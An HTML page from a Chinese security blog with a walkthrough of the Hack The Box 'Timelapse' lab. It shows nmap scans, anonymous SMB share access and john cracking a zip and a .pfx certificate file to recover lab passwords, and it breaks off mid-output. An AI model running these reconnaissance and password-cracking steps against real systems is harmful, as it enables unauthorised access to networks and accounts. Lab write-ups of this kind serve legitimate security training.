@@ -1,0 +1,798 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 靶场技能介绍章节技能：SMB匿名访问、zip2john使用、pfx2john使用、.pfx提取秘钥和证书、evil-winrm 使用秘钥和证书登录、powershell历史命令记录敏感信息泄露、LAPS特权组成员">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Timelapse-htb-writeup">
+<meta property="og:url" content="https://sh1yan.top/2024/03/19/Timelapse-htb-writeup/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 靶场技能介绍章节技能：SMB匿名访问、zip2john使用、pfx2john使用、.pfx提取秘钥和证书、evil-winrm 使用秘钥和证书登录、powershell历史命令记录敏感信息泄露、LAPS特权组成员">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/Timelapse-htb-writeup/1.png">
+<meta property="article:published_time" content="2024-03-19T15:50:55.000Z">
+<meta property="article:modified_time" content="2024-03-27T07:23:45.284Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="shooting-range">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/Timelapse-htb-writeup/1.png">
+  
+  
+  
+  <title>Timelapse-htb-writeup - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Timelapse-htb-writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-03-19 23:50" pubdate>
+          2024年3月19日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          15k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          123 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Timelapse-htb-writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：SMB匿名访问、zip2john使用、pfx2john使用、.pfx提取秘钥和证书、evil-winrm 使用秘钥和证书登录、powershell历史命令记录敏感信息泄露、LAPS特权组成员</p>
+<span id="more"></span>  
+
+<p>参考链接：<code>https://0xdf.gitlab.io/2022/08/20/htb-timelapse.html</code></p>
+<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、获取下靶机IP地址：10.10.11.152</p>
+<p>2、扫描下开放端口情况</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p- -sU --min-rate=<span class="hljs-number">10000</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.152</span><br>[sudo] kali 的密码：<br>PORT    STATE SERVICE<br><span class="hljs-number">53</span>/udp  open  domain<br><span class="hljs-number">88</span>/udp  open  kerberos-sec<br><span class="hljs-number">123</span>/udp open  ntp<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p- --min-rate=<span class="hljs-number">10000</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.152</span> -oG allports<br>PORT      STATE SERVICE<br><span class="hljs-number">53</span>/tcp    open  domain<br><span class="hljs-number">88</span>/tcp    open  kerberos-sec<br><span class="hljs-number">135</span>/tcp   open  msrpc<br><span class="hljs-number">139</span>/tcp   open  netbios-ssn<br><span class="hljs-number">389</span>/tcp   open  ldap<br><span class="hljs-number">445</span>/tcp   open  microsoft-ds<br><span class="hljs-number">593</span>/tcp   open  http-rpc-epmap<br><span class="hljs-number">636</span>/tcp   open  ldapssl<br><span class="hljs-number">3268</span>/tcp  open  globalcatLDAP<br><span class="hljs-number">3269</span>/tcp  open  globalcatLDAPssl<br><span class="hljs-number">5986</span>/tcp  open  wsmans<br><span class="hljs-number">9389</span>/tcp  open  adws<br><span class="hljs-number">49667</span>/tcp open  unknown<br><span class="hljs-number">49673</span>/tcp open  unknown<br><span class="hljs-number">49674</span>/tcp open  unknown<br><span class="hljs-number">49727</span>/tcp open  unknown<br><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p53,<span class="hljs-number">88</span>,<span class="hljs-number">135</span>,<span class="hljs-number">139</span>,<span class="hljs-number">389</span>,<span class="hljs-number">445</span>,<span class="hljs-number">593</span>,<span class="hljs-number">636</span>,<span class="hljs-number">3268</span>,<span class="hljs-number">3269</span>,<span class="hljs-number">5986</span>,<span class="hljs-number">9389</span>,<span class="hljs-number">49667</span>,<span class="hljs-number">49673</span>,<span class="hljs-number">49674</span>,<span class="hljs-number">49727</span> -sV -sC --min-rate=<span class="hljs-number">10000</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.152</span><br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-03-19 21:51 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.152</span><br>Host is up (<span class="hljs-number">0.30</span>s latency).<br><br>PORT      STATE SERVICE           VERSION<br><span class="hljs-number">53</span>/tcp    open  domain            Simple DNS Plus<br><span class="hljs-number">88</span>/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: <span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-19</span> <span class="hljs-number">21</span>:<span class="hljs-number">52</span>:<span class="hljs-number">08</span>Z)<br><span class="hljs-number">135</span>/tcp   open  msrpc             Microsoft Windows RPC<br><span class="hljs-number">139</span>/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn<br><span class="hljs-number">389</span>/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)<br><span class="hljs-number">445</span>/tcp   open  microsoft-ds?<br><span class="hljs-number">593</span>/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP <span class="hljs-number">1.0</span><br><span class="hljs-number">636</span>/tcp   open  ldapssl?<br><span class="hljs-number">3268</span>/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)<br><span class="hljs-number">3269</span>/tcp  open  globalcatLDAPssl?<br><span class="hljs-number">5986</span>/tcp  open  ssl/http          Microsoft HTTPAPI httpd <span class="hljs-number">2.0</span> (SSDP/UPnP)<br>| tls-alpn: <br>|_  http/<span class="hljs-number">1.1</span><br>|_ssl-date: <span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-19</span>T21:<span class="hljs-number">55</span>:<span class="hljs-number">21</span>+<span class="hljs-number">00</span>:<span class="hljs-number">00</span>; +<span class="hljs-number">7</span>h59m59s from scanner time.<br>| ssl-cert: Subject: commonName=dc01.timelapse.htb<br>| Not valid before: <span class="hljs-number">2021</span><span class="hljs-number">-10</span><span class="hljs-number">-25</span>T14:<span class="hljs-number">05</span>:<span class="hljs-number">29</span><br>|_Not valid after:  <span class="hljs-number">2022</span><span class="hljs-number">-10</span><span class="hljs-number">-25</span>T14:<span class="hljs-number">25</span>:<span class="hljs-number">29</span><br>|_http-title: Not Found<br><span class="hljs-number">9389</span>/tcp  open  mc-nmf            .NET Message Framing<br><span class="hljs-number">49667</span>/tcp open  msrpc             Microsoft Windows RPC<br><span class="hljs-number">49673</span>/tcp open  ncacn_http        Microsoft Windows RPC over HTTP <span class="hljs-number">1.0</span><br><span class="hljs-number">49674</span>/tcp open  msrpc             Microsoft Windows RPC<br><span class="hljs-number">49727</span>/tcp open  unknown<br>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>|_clock-skew: mean: <span class="hljs-number">7</span>h59m58s, deviation: <span class="hljs-number">0</span>s, median: <span class="hljs-number">7</span>h59m58s<br>| smb2-time: <br>|   date: <span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-19</span>T21:<span class="hljs-number">54</span>:<span class="hljs-number">27</span><br>|_  start_date: N/A<br>| smb2-security-mode: <br>|   <span class="hljs-number">3</span>:<span class="hljs-number">1</span>:<span class="hljs-number">1</span>: <br>|_    Message signing enabled and required<br></code></pre></td></tr></table></figure>
+
+<p>3、绑定下本地hosts域名</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(root㉿offsec)-[~]<br>└─<span class="hljs-meta"># echo <span class="hljs-string">&#x27;10.10.11.152 dc01.timelapse.htb timelapse.htb&#x27;</span> &gt;&gt; /etc/hosts</span><br></code></pre></td></tr></table></figure>
+
+<p>4、查看下是否存在SMB匿名访问</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ smbclient -L <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.152</span> -N<br><br>        Sharename       Type      Comment<br>        ---------       ----      -------<br>        ADMIN$          Disk      Remote Admin<br>        C$              Disk      Default share<br>        IPC$            IPC       Remote IPC<br>        NETLOGON        Disk      Logon server share <br>        Shares          Disk      <br>        SYSVOL          Disk      Logon server share <br>Reconnecting with SMB1 <span class="hljs-keyword">for</span> workgroup listing.<br>do_connect: Connection to <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.152</span> failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)<br>Unable to connect with SMB1 -- no workgroup available<br></code></pre></td></tr></table></figure>
+
+<p>5、逐个访问下，看看有什么发现没有</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ smbclient \\\\<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.152</span>\\SYSVOL -N<br>Try <span class="hljs-string">&quot;help&quot;</span> to get a <span class="hljs-built_in">list</span> of possible commands.<br>smb: \&gt; ls<br>NT_STATUS_ACCESS_DENIED listing \*<br>smb: \&gt; dir<br>NT_STATUS_ACCESS_DENIED listing \*<br>smb: \&gt; pwd<br>Current directory is \\<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.152</span>\SYSVOL\<br>smb: \&gt; <span class="hljs-built_in">exit</span><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ smbclient \\\\<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.152</span>\\Shares -N<br>Try <span class="hljs-string">&quot;help&quot;</span> to get a <span class="hljs-built_in">list</span> of possible commands.<br>smb: \&gt; ls<br>  .                                   D        <span class="hljs-number">0</span>  Mon Oct <span class="hljs-number">25</span> <span class="hljs-number">23</span>:<span class="hljs-number">39</span>:<span class="hljs-number">15</span> <span class="hljs-number">2021</span><br>  ..                                  D        <span class="hljs-number">0</span>  Mon Oct <span class="hljs-number">25</span> <span class="hljs-number">23</span>:<span class="hljs-number">39</span>:<span class="hljs-number">15</span> <span class="hljs-number">2021</span><br>  Dev                                 D        <span class="hljs-number">0</span>  Tue Oct <span class="hljs-number">26</span> <span class="hljs-number">03</span>:<span class="hljs-number">40</span>:<span class="hljs-number">06</span> <span class="hljs-number">2021</span><br>  HelpDesk                            D        <span class="hljs-number">0</span>  Mon Oct <span class="hljs-number">25</span> <span class="hljs-number">23</span>:<span class="hljs-number">48</span>:<span class="hljs-number">42</span> <span class="hljs-number">2021</span><br><br>                <span class="hljs-number">6367231</span> blocks of size <span class="hljs-number">4096.</span> <span class="hljs-number">1264689</span> blocks available<br>smb: \&gt; cd Dev\<br>smb: \Dev\&gt; ls<br>  .                                   D        <span class="hljs-number">0</span>  Tue Oct <span class="hljs-number">26</span> <span class="hljs-number">03</span>:<span class="hljs-number">40</span>:<span class="hljs-number">06</span> <span class="hljs-number">2021</span><br>  ..                                  D        <span class="hljs-number">0</span>  Tue Oct <span class="hljs-number">26</span> <span class="hljs-number">03</span>:<span class="hljs-number">40</span>:<span class="hljs-number">06</span> <span class="hljs-number">2021</span><br>  winrm_backup.zip                    A     <span class="hljs-number">2611</span>  Mon Oct <span class="hljs-number">25</span> <span class="hljs-number">23</span>:<span class="hljs-number">46</span>:<span class="hljs-number">42</span> <span class="hljs-number">2021</span><br><br>                <span class="hljs-number">6367231</span> blocks of size <span class="hljs-number">4096.</span> <span class="hljs-number">1263607</span> blocks available<br>smb: \Dev\&gt; get winrm_backup.zip <br>getting file \Dev\winrm_backup.zip of size <span class="hljs-number">2611</span> as winrm_backup.zip (<span class="hljs-number">1.0</span> KiloBytes/sec) (average <span class="hljs-number">1.0</span> KiloBytes/sec)<br>smb: \Dev\&gt; cd ../<br>smb: \&gt; cd HelpDesk\<br>smb: \HelpDesk\&gt; ls<br>  .                                   D        <span class="hljs-number">0</span>  Mon Oct <span class="hljs-number">25</span> <span class="hljs-number">23</span>:<span class="hljs-number">48</span>:<span class="hljs-number">42</span> <span class="hljs-number">2021</span><br>  ..                                  D        <span class="hljs-number">0</span>  Mon Oct <span class="hljs-number">25</span> <span class="hljs-number">23</span>:<span class="hljs-number">48</span>:<span class="hljs-number">42</span> <span class="hljs-number">2021</span><br>  LAPS.x64.msi                        A  <span class="hljs-number">1118208</span>  Mon Oct <span class="hljs-number">25</span> <span class="hljs-number">22</span>:<span class="hljs-number">57</span>:<span class="hljs-number">50</span> <span class="hljs-number">2021</span><br>  LAPS_Datasheet.docx                 A   <span class="hljs-number">104422</span>  Mon Oct <span class="hljs-number">25</span> <span class="hljs-number">22</span>:<span class="hljs-number">57</span>:<span class="hljs-number">46</span> <span class="hljs-number">2021</span><br>  LAPS_OperationsGuide.docx           A   <span class="hljs-number">641378</span>  Mon Oct <span class="hljs-number">25</span> <span class="hljs-number">22</span>:<span class="hljs-number">57</span>:<span class="hljs-number">40</span> <span class="hljs-number">2021</span><br>  LAPS_TechnicalSpecification.docx      A    <span class="hljs-number">72683</span>  Mon Oct <span class="hljs-number">25</span> <span class="hljs-number">22</span>:<span class="hljs-number">57</span>:<span class="hljs-number">44</span> <span class="hljs-number">2021</span><br><br>                <span class="hljs-number">6367231</span> blocks of size <span class="hljs-number">4096.</span> <span class="hljs-number">1260293</span> blocks available<br>smb: \HelpDesk\&gt;<br><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ smbclient \\\\<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.152</span>\\NETLOGON -N<br>Try <span class="hljs-string">&quot;help&quot;</span> to get a <span class="hljs-built_in">list</span> of possible commands.<br>smb: \&gt; ls<br>NT_STATUS_ACCESS_DENIED listing \*<br>smb: \&gt; <span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure>
+
+<p>6、获取的压缩包有密码，需要转码为可以破解的格式，并破解下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ zip2john winrm_backup.zip &gt; hash<br>ver <span class="hljs-number">2.0</span> efh <span class="hljs-number">5455</span> efh <span class="hljs-number">7875</span> winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=<span class="hljs-number">2405</span>, decmplen=<span class="hljs-number">2555</span>, crc=<span class="hljs-number">12</span>EC5683 ts=<span class="hljs-number">72</span>AA cs=<span class="hljs-number">72</span>aa type=<span class="hljs-number">8</span><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo john hash  --wordlist=/usr/share/wordlists/rockyou.txt <br>Using <span class="hljs-keyword">default</span> input encoding: UTF<span class="hljs-number">-8</span><br>Loaded <span class="hljs-number">1</span> password hash (PKZIP [<span class="hljs-number">32</span>/<span class="hljs-number">64</span>])<br>Will run <span class="hljs-number">4</span> OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to <span class="hljs-built_in">abort</span>, almost any other key <span class="hljs-keyword">for</span> status<br>supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     <br><span class="hljs-number">1</span>g <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> DONE (<span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-19</span> <span class="hljs-number">23</span>:<span class="hljs-number">03</span>) <span class="hljs-number">3.448</span>g/s <span class="hljs-number">11977</span>Kp/s <span class="hljs-number">11977</span>Kc/s <span class="hljs-number">11977</span>KC/s suzyqzb..superkebab<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed. <br></code></pre></td></tr></table></figure>
+
+<p>7、成功获取到密码，但是解码发现的 legacyy_dev_auth.pfx 文件依旧存在密码，需要继续破解下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ pfx2john legacyy_dev_auth.pfx &gt; hash1<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo john hash1 --wordlist=/usr/share/wordlists/rockyou.txt <br>[sudo] kali 的密码：<br>Using <span class="hljs-keyword">default</span> input encoding: UTF<span class="hljs-number">-8</span><br>Loaded <span class="hljs-number">1</span> password hash (pfx, (.pfx, .p12) [PKCS#<span class="hljs-number">12</span> PBE (SHA1/SHA2) <span class="hljs-number">128</span>/<span class="hljs-number">128</span> ASIMD <span class="hljs-number">4</span>x])<br>Cost <span class="hljs-number">1</span> (iteration count) is <span class="hljs-number">2000</span> <span class="hljs-keyword">for</span> all loaded hashes<br>Cost <span class="hljs-number">2</span> (mac-type [<span class="hljs-number">1</span>:SHA1 <span class="hljs-number">224</span>:SHA224 <span class="hljs-number">256</span>:SHA256 <span class="hljs-number">384</span>:SHA384 <span class="hljs-number">512</span>:SHA512]) is <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> all loaded hashes<br>Will run <span class="hljs-number">4</span> OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to <span class="hljs-built_in">abort</span>, almost any other key <span class="hljs-keyword">for</span> status<br>thuglegacy       (legacyy_dev_auth.pfx)     <br><span class="hljs-number">1</span>g <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">01</span>:<span class="hljs-number">13</span> DONE (<span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-19</span> <span 